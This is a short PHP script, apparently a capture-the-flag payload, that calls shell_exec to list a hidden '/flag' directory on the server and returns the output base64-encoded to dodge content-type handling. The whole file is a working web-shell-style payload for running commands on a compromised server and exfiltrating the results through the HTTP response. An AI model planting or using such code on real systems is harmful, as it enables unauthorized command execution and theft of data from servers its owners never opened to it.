<?php
// list /flag directory and return base64 to avoid content-type issues
$out = shell_exec('ls -la /flag/0528026a9109f91adde76ff8375df9dc 2>&1');
echo base64_encode($out);
